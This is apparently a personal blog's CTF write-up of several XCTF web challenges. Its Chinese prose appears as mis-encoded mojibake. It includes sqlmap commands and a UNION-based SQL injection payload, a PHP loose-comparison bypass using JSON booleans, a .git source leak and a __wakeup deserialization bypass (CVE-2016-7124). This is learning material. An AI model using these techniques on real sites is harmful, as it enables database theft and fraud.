<!DOCTYPE html>
<html lang="">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Lethe">


    <meta name="subtitle" content="Life is a struggle">


    <meta name="description" content="Lethe's Blog">


    <meta name="keywords" content="Lethe's Blog">


<title>æ”»é˜²ä¸–ç•ŒWeb | Lethe&#39;s Blog</title>



    <link rel="icon" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        <!-- MathJaxé…ç½®ï¼Œå¯é€šè¿‡å•ç¾å…ƒç¬¦å·ä¹¦å†™è¡Œå†…å…¬å¼ç­‰ -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- ç»™MathJaxå…ƒç´ æ·»åŠ has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- é€šè¿‡è¿æ¥CDNåŠ è½½MathJaxçš„jsä»£ç  -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<meta name="generator" content="Hexo 6.1.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "Â· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "Â· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Lethe&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">Â·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">æ”»é˜²ä¸–ç•ŒWeb</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">May 21, 2019&nbsp;&nbsp;1:23:57</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/Writeup/">Writeup</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="ics-06ï¼ˆXCTF-4th-CyberEarthï¼‰"><a href="#ics-06ï¼ˆXCTF-4th-CyberEarthï¼‰" class="headerlink" title="ics-06ï¼ˆXCTF 4th-CyberEarthï¼‰"></a>ics-06ï¼ˆXCTF 4th-CyberEarthï¼‰</h1><p><strong>é¢˜ç›®æè¿°</strong>ï¼šäº‘å¹³å°æŠ¥è¡¨ä¸­å¿ƒæ”¶é›†äº†è®¾å¤‡ç®¡ç†åŸºç¡€æœåŠ¡çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®è¢«åˆ é™¤äº†ï¼Œåªæœ‰ä¸€å¤„ç•™ä¸‹äº†å…¥ä¾µè€…çš„ç—•è¿¹ã€‚</p>
<p>è¿›å…¥é¢˜ç›®åï¼Œå‘ç°è®¿é—®index.phpä¼šè¢«è·³è½¬åˆ°index.php?id&#x3D;1 è€Œä¸”è¿˜æœ‰å†™é€åˆ†é¢˜ï¼Œå°è¯•sqlæ³¨å…¥æ— æœï¼ŒåŸæ¥æ˜¯ä¸€é“è„‘æ´é¢˜ã€‚<br>çˆ†ç ´idè‡³id&#x3D;2333ï¼Œå³å¾—åˆ°flagã€‚<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190502225712244.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><br></p>
<h1 id="NewsCenterï¼ˆ-XCTF-4th-QCTF-2018ï¼‰"><a href="#NewsCenterï¼ˆ-XCTF-4th-QCTF-2018ï¼‰" class="headerlink" title="NewsCenterï¼ˆ XCTF 4th-QCTF-2018ï¼‰"></a>NewsCenterï¼ˆ XCTF 4th-QCTF-2018ï¼‰</h1><p>1ã€è¿›å…¥ç½‘ç«™åï¼Œæœ‰ä¸€ä¸ªæœç´¢æ ï¼ŒæŠ“åŒ…å¾—ï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190502230634849.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>2ã€æ€€ç–‘<code>serch</code>ä¸ºæ³¨å…¥ç‚¹ï¼Œå°è¯•sqlæ³¨å…¥ã€‚å°†æŠ¥æ–‡ä¿å­˜ä¸‹æ¥ï¼Œç”¨sqlmapè·‘ä¸€ä¸‹ï¼Œå‘ç°å¯ä»¥ç›´æ¥å‡ºç»“æœã€‚</p>
<p>(1)<code>python2 sqlmap.py -r 1.txt --dbs</code><br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190502230859165.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ï¼ˆ2ï¼‰<code>python2 sqlmap.py -r 2.txt -D &quot;news&quot; -T &quot;secret_table&quot; -C &quot;fl4g,id&quot; --dump</code><br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190502233415629.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>ç–‘é—®</strong>ï¼š<br>æœ€åçˆ†å­—æ®µå€¼çš„æ—¶å€™ï¼Œå¦‚æœåªæƒ³å¾—åˆ°<code>fl4g</code>åˆ—çš„å­—æ®µä¼šæŠ¥é”™ï¼š<br><code>python2 sqlmap.py -r 2.txt -D &quot;news&quot; -T &quot;secret_table&quot; -C &quot;fl4g&quot; --dump</code><br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/2019050223401477.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°æ­¤æ—¶sqlmapç”¨çš„payloadæ˜¯ï¼š<br><code>search=123&#39; UNION ALL SELECT NULL,CONCAT(CONCAT(&#39;qqkqq&#39;,&#39;vvlrAdZPyMyCbSOJTgUbVOnivbMBieHDoFAFmACG&#39;),&#39;qjvbq&#39;),NULL-- qMtC</code><br>å†æ ¹æ®æŠ¥é”™ä¿¡æ¯ï¼ŒåŸå› åº”è¯¥æ˜¯<strong>è”åˆæŸ¥è¯¢æ³¨å…¥å­—æ®µé—´ç¼–ç ä¸åŒæ— æ³•æ˜¾ç¤ºå†…å®¹é—®é¢˜</strong>ã€‚<br>ä½†æ˜¯åŒæ—¶æŸ¥è¯¢<code>fl4g</code>å’Œ<code>id</code></p>
<h1 id="lotteryï¼ˆXCTF-4th-QCTF-2018ï¼‰"><a href="#lotteryï¼ˆXCTF-4th-QCTF-2018ï¼‰" class="headerlink" title="lotteryï¼ˆXCTF 4th-QCTF-2018ï¼‰"></a>lotteryï¼ˆXCTF 4th-QCTF-2018ï¼‰</h1><p>æ‰“å¼€é¢˜ç›®å…ˆæ³¨å†Œï¼Œç„¶åå‘ç°flagå¯ä»¥è´­ä¹°ã€‚ä½†å¾—å…ˆå»ä¹°å½©ç¥¨èµ¢å¾—è¶³å¤Ÿçš„é’±ï¼Œä¸ƒä½æ•°å­—çš„å½©ç¥¨ï¼ŒçŒœä¸­çš„ä½æ•°è¶Šå¤šï¼Œèµ¢å¾—çš„é’±è¶Šå¤šï¼Œå› æ­¤åº”è¯¥åœ¨ä¹°å½©ç¥¨è¿™é‡Œå‡ºäº†ä¸€äº›æ¼æ´ã€‚<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/2019041623474711.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>1ã€é¦–å…ˆè®¿é—®ç›®å½•<code>robots.txt</code>ï¼Œå­˜åœ¨<code>.git</code>æ³„éœ²ã€‚<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190416234149623.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>2ã€åˆ©ç”¨å·¥å…·<strong>GitHack</strong>ï¼Œå¾—åˆ°ç½‘ç«™æºç ï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190416234519806.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>3ã€è¿›è¡Œä»£ç å®¡è®¡ï¼Œé—®é¢˜å‡ºç°åœ¨<code>api.php</code>é‡Œçš„<code>buy</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯ç”¨æ¥åˆ¤æ–­æ˜¯å¦çŒœä¸­ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">require_registered</span>();</span><br><span class="line">	<span class="title function_ invoke__">require_min_money</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">	<span class="variable">$numbers</span> = <span class="variable">$req</span>[<span class="string">&#x27;numbers&#x27;</span>];</span><br><span class="line">	<span class="variable">$win_numbers</span> = <span class="title function_ invoke__">random_win_nums</span>();	<span class="comment">//ä¸­å°†å·ç ç”±éšæœºæ•°å‡½æ•°ç”Ÿæˆ</span></span><br><span class="line">	<span class="variable">$same_count</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;  <span class="comment">//è¿™é‡Œç”¨çš„&#x27;==&#x27;å¼±æ¯”è¾ƒæ¥åˆ¤æ–­æ¯ä¸€ä½æ•°æ˜¯å¦çŒœä¸­</span></span><br><span class="line">			<span class="variable">$same_count</span>++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">switch</span> (<span class="variable">$same_count</span>) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">5</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">20</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">300</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">1800</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">200000</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">5000000</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$money</span> += <span class="variable">$prize</span> - <span class="number">2</span>;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>] = <span class="variable">$money</span>;</span><br><span class="line">	<span class="title function_ invoke__">response</span>([<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>,<span class="string">&#x27;numbers&#x27;</span>=&gt;<span class="variable">$numbers</span>, <span class="string">&#x27;win_numbers&#x27;</span>=&gt;<span class="variable">$win_numbers</span>, <span class="string">&#x27;money&#x27;</span>=&gt;<span class="variable">$money</span>, <span class="string">&#x27;prize&#x27;</span>=&gt;<span class="variable">$prize</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>å…¶ä¸­ <code>$numbers</code> æ¥è‡ªç”¨æˆ·<code>json</code>è¾“å…¥ <code>&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:&quot;1234567&quot;&#125;</code>ï¼Œæ²¡æœ‰æ£€æŸ¥æ•°æ®ç±»å‹ã€‚ </li>
<li>ä¸­å¥–å·ç <code>$win_numbers</code> æ˜¯éšæœºç”Ÿæˆçš„æ•°å­—å­—ç¬¦ä¸²ã€‚</li>
<li>åˆ¤æ–­é€»è¾‘ä½¿ç”¨çš„æ˜¯ PHP å¼±ç±»å‹æ¾æ•£æ¯”è¾ƒï¼Œå› æ­¤æ¯”è¾ƒå¥½ç»•è¿‡ï¼Œä»¥<code>&quot;1&quot;</code>ä¸ºä¾‹ï¼Œå’Œ<code>TRUE</code>,<code>1</code>,<code>&quot;1&quot;</code>éƒ½ç›¸ç­‰ã€‚</li>
</ul>
<p>ï¼ˆ4ï¼‰ç”±äº json æ”¯æŒå¸ƒå°”å‹æ•°æ®ï¼Œå› æ­¤å¯ä»¥æŠ“åŒ…æ”¹åŒ…ã€‚</p>
<p>æŠ“åˆ°çš„åŒ…å¦‚ä¸‹ï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190416235806643.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ”¹å®Œæ•°æ®ä¹‹åï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190416235912387.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™æ ·æ”¹å®Œä¹‹åï¼Œå½“å‡½æ•°åœ¨åˆ¤æ–­å·ç æ˜¯å¦ä¸­å¥–æ—¶ï¼Œæ¯æ¬¡éƒ½ä¼šåˆ¤æ–­<code>tureæ˜¯å¦ç­‰äºæŸä¸ªéšæœºæ•°</code>ï¼Œè¿™æ ·åªè¦éšæœºæ•°ä¸æ˜¯0ï¼Œéƒ½å°†æˆåŠŸåˆ¤æ–­ã€‚<br>è¿™æ ·å¤šå‘åŒ…å‡ æ¬¡ï¼Œå°±å¯ä»¥èµ¢å¾—è¶³å¤Ÿçš„é’±æ¥è´­ä¹°flagäº†ï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190417000228755.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<br>

<h1 id="NaNNaNNaNNaN-Batmanï¼ˆtinyctf-2014ï¼‰"><a href="#NaNNaNNaNNaN-Batmanï¼ˆtinyctf-2014ï¼‰" class="headerlink" title="NaNNaNNaNNaN-Batmanï¼ˆtinyctf-2014ï¼‰"></a>NaNNaNNaNNaN-Batmanï¼ˆtinyctf-2014ï¼‰</h1><p>ç›´æ¥ç»™äº†ä¸€ä¸ªé™„ä»¶ï¼Œé‡Œé¢æ˜¯ä¸€æ®µJavascriptè„šæœ¬ï¼Œçœ‹èµ·æ¥æœ‰ç‚¹å¥‡æ€ªï¼Œæ”¾åœ¨è‡ªå·±çš„ç¯å¢ƒé‡Œæ‰“å¼€æ˜¯ä¸€ä¸ªè¾“å…¥æ¡†å’Œä¸€ä¸ªæäº¤æŒ‰é’®ã€‚<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190417010640591.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">_=<span class="string">&#x27;function $()&#123;e=getEleById(&quot;c&quot;).value;length==16^be0f23233ace98aa$c7be9)&#123;tfls_aie&#125;na_h0lnrg&#123;e_0iit\&#x27;_ns=[t,n,r,i];for(o=0;o&lt;13;++o)&#123;	[0]);.splice(0,1)&#125;&#125;&#125;	\&#x27;&lt;input id=&quot;c&quot;&gt;&lt; onclick=$()&gt;Ok&lt;/&gt;\&#x27;);delete _var &quot;,&quot;docu.)match(/&quot;];/)!=null=[&quot;	write(s[o%4]buttonif(e.ment&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(Y <span class="keyword">in</span> $=<span class="string">&#x27;	&#x27;</span>) <span class="title function_">with</span>(_.<span class="title function_">split</span>($[Y]))_=<span class="title function_">join</span>(<span class="title function_">pop</span>());</span><br><span class="line"><span class="built_in">eval</span>(_)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>1ã€é¦–å…ˆå°†æœ€åçš„<code>eval(_)</code>æ”¹ä¸º<code>console.log(_)</code>ï¼Œå¹¶ç”¨æµè§ˆå™¨ä¸Šçš„æ§åˆ¶å°è¿è¡Œè¿™æ®µä»£ç ï¼Œå‘ç°å˜é‡<code>_</code>æ˜¯ä¸€ä¸ªå‡½æ•°ï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/2019041700513918.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">$</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> e=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;c&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span>(e.<span class="property">length</span>==<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span>(e.<span class="title function_">match</span>(<span class="regexp">/^be0f23/</span>)!=<span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">if</span>(e.<span class="title function_">match</span>(<span class="regexp">/233ac/</span>)!=<span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">if</span>(e.<span class="title function_">match</span>(<span class="regexp">/e98aa$/</span>)!=<span class="literal">null</span>)</span><br><span class="line">                    <span class="keyword">if</span>(e.<span class="title function_">match</span>(<span class="regexp">/c7be9/</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">var</span> t=[<span class="string">&quot;fl&quot;</span>,<span class="string">&quot;s_a&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;e&#125;&quot;</span>];</span><br><span class="line">                        <span class="keyword">var</span> n=[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;_h0l&quot;</span>,<span class="string">&quot;n&quot;</span>];</span><br><span class="line">                        <span class="keyword">var</span> r=[<span class="string">&quot;g&#123;&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;_0&quot;</span>];</span><br><span class="line">                        <span class="keyword">var</span> i=[<span class="string">&quot;it&#x27;&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;n&quot;</span>];</span><br><span class="line">                        <span class="keyword">var</span> s=[t,n,r,i];</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">var</span> a=<span class="variable language_">document</span>.<span class="title function_">write</span>(s[o%<span class="number">4</span>][<span class="number">0</span>]);s[o%<span class="number">4</span>].<span class="title function_">splice</span>(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure>
<p>2ã€å®¡è®¡ä»£ç ï¼Œä¹Ÿå°±æ˜¯åœ¨web100ï¼Œä¹Ÿå°±æ˜¯åœ¨ä¸€å¼€å§‹çš„è¾“å…¥æ¡†é‡Œè¾“å…¥çš„å€¼è¦æ»¡è¶³ä¸‹é¢äº”ä¸ªæ¡ä»¶çš„åˆ¤æ–­æ‰èƒ½æ‰§è¡Œä¸‹é¢çš„ä»£ç ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(e.length==16)</span><br><span class="line">       if(e.match(/^be0f23/)!=null)</span><br><span class="line">           if(e.match(/233ac/)!=null)</span><br><span class="line">               if(e.match(/e98aa$/)!=null)</span><br><span class="line">                   if(e.match(/c7be9/)!=null)</span><br></pre></td></tr></table></figure>
<ul>
<li>è¾“å…¥çš„å­—ç¬¦ä¸²é•¿åº¦å¿…é¡»ä¸º16ä¸ªå­—ç¬¦</li>
<li>å­—ç¬¦ä¸²çš„å¼€å¤´å¿…é¡»è¦åŒ¹é…<code>be0f23</code></li>
<li>å­—ç¬¦ä¸²çš„ç»“å°¾å¿…é¡»è¦åŒ¹é…<code>e98aa</code></li>
<li>å­—ç¬¦ä¸²ä¸­è¦èƒ½åŒ¹é…åˆ°<code>233ac</code>å’Œ<code>c7be9</code></li>
</ul>
<p>å› ä¸ºé™åˆ¶äº†å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå› æ­¤è¿™é‡Œè¦åˆ©ç”¨é‡å æ¥æ„é€ é•¿åº¦ä¸º16ä¸”æ»¡è¶³æ‰€æœ‰æ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²ã€‚<br>æ„é€ å¦‚ä¸‹ï¼š<code>be0f233ac7be98aa</code></p>
<p>3ã€å°†ä¸Šä¸€æ­¥æ„é€ çš„å­—ç¬¦ä¸²æäº¤åˆ°é‚£ä¸ªè¾“å…¥æ¡†ä¸­ï¼Œå¾—åˆ°flagã€‚<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190417011505519.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190417011519311.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<br>

<h1 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h1><p>1ã€çœ‹åå­—å°±çŸ¥é“æ˜¯ä¸€é“ååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œæ‰“å¼€ç½‘ç«™çœ‹åˆ°:<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190503005731647.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>2ã€å°†è¯¥ç±»çš„å¯¹è±¡åºåˆ—åŒ–åä¸ºï¼š<code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code><br>æ¯å½“åºåˆ—åŒ–æ—¶éƒ½ä¼šæ‰§è¡Œ<code>__wakeup()</code>å‡½æ•°ï¼Œè€Œè¿™é‡Œæ˜æ˜¾éœ€è¦ç»•è¿‡<code>__wakeup()</code>å‡½æ•°ï¼Œé€šè¿‡<code>CVE-2016-7124</code>æ¥ç»•è¿‡ï¼Œç®€å•æ¥è¯´å°±æ˜¯å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡<code>__wakeup</code>çš„æ‰§è¡Œã€‚</p>
